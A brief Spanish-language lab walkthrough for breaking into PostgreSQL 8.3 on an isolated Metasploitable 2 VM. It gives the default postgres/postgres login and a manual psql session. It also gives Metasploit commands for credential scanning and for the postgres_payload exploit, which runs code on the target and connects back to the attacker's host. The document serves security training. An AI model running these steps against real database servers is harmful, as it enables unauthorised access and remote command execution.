# PostgreSQL 8.3 (puerto 5432) — Metasploitable 2

> Práctica de laboratorio: aplicar únicamente sobre tu propia máquina Metasploitable 2 (`192.168.100.9`), aislada de Internet. Documento de la serie [Reconocimiento y Metasploit](./01_reconocimiento_y_metasploit.md).

**Qué es:** otro gestor de base de datos, **PostgreSQL 8.3**, **puerto 5432**.

**Cómo se explota:** credenciales por defecto **`postgres / postgres`**. Con una cuenta de superusuario de PostgreSQL se puede llegar incluso a **ejecutar comandos** en el sistema (cargando una función desde una librería).

## Explotación manual (sin Metasploit)

```bash
psql -h 192.168.100.9 -U postgres        # contraseña: postgres
# dentro:
\l                                  # lista las bases de datos
select version();
```

## Explotación con Metasploit

```bash
use auxiliary/scanner/postgres/postgres_login
set RHOSTS 192.168.100.9
run

# Con credenciales válidas, intentar ejecución de código:
use exploit/multi/postgres/postgres_payload
set RHOSTS 192.168.100.9
set USERNAME postgres
set PASSWORD postgres
set LHOST 192.168.100.8
run
```
